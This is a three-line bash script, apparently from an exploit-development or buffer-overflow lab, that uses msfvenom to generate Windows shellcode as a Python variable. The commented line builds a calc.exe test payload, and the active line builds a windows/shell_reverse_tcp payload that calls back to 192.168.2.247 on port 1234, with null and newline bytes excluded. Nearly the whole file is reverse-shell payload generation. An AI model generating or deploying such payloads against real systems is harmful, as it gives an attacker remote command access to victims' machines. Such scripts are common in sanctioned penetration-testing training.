#!/bin/bash
#msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A' -f python --var-name shellcode_shell EXITFUNC=thread LHOST=192.168.2.247 LPORT=1234
